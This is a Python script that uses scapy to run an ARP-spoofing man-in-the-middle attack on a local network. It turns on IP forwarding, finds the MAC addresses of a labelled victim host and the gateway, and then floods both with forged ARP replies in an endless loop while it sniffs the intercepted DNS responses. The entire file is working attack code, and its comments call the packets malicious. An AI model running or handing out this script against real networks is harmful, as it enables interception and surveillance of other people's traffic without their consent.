from scapy.all import *
import os
import time

os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')

ether = Ether()

## Discovering MAC Address of Target Machine

print('Figuring Out Mac Address of Victim Machine with IP address 192.168.0.203')
broadcast1 = Ether(dst = 'ff:ff:ff:ff:ff:ff')
arp_layer1 = ARP(pdst = '192.168.0.203')
entire_packet1 = broadcast1 / arp_layer1
answer1 = srp(entire_packet1, timeout = 2, verbose = True, iface = "enp0s3")[0]

time.sleep(2)

print('Figuring out Mac Address of default gateway router with IP address of 192.168.0.1')
broadcast2 = Ether(dst = 'ff:ff:ff:ff:ff:ff')
arp_layer2 = ARP(pdst = '192.168.0.1')
entire_packet2 = broadcast2 / arp_layer2
answer2 = srp(entire_packet2, timeout = 2, verbose = True, iface = "enp0s3")[0]

## Creating Malicous ARP Response to victims machine

victim_mac_addr = answer1[0][1].hwsrc
router_mac_addr = answer2[0][1].hwsrc
attacker_mac_addr = ether.src

print(f"Victim MAC: {victim_mac_addr}")
print(f"Router MAC: {router_mac_addr}")
print(f"Attacker MAC: {attacker_mac_addr}")


def filterPkt(pkt):
    '''return pkt.haslayer(DNS) and pkt[DNS].qr == 1 Ether in pkt and (
        (pkt[Ether].src == victim_mac_addr and pkt[Ether].dst == attacker_mac_addr) or
        (pkt[Ether].src == attacker_mac_addr and pkt[Ether].dst == router_mac_addr) or 
        (pkt[Ether].src == router_mac_addr and pkt[Ether].dst == attacker_mac_addr)  or
        (pkt[Ether].src == attacker_mac_addr and pkt[Ether].dst == victim_mac_addr) 
    )'''

    return pkt.haslayer(DNS) and pkt[DNS].qr == 1 and Ether in pkt and (pkt[Ether].src == router_mac_addr and pkt[Ether].dst == attacker_mac_addr)


print('Waiting for requests from victim')
def poison():
    print("Starting ARP poisoning loop...")
    while True:

        print('corruping victim')
        packet = ARP(op=2, hwdst = victim_mac_addr, pdst='192.168.0.203', psrc='192.168.0.1')
        send(packet, verbose = False, iface = "enp0s3")
        
        time.sleep(5)

        print('corrupting router')
        packet = ARP(op=2, hwdst = router_mac_addr, pdst='192.168.0.1', psrc='192.168.0.203')
        send(packet, verbose = False, iface = "enp0s3")

threading.Thread(target=poison, daemon=True).start()

sniff(prn = lambda x: x[0].show(),  filter = 'udp', lfilter = filterPkt, iface = "enp0s3")

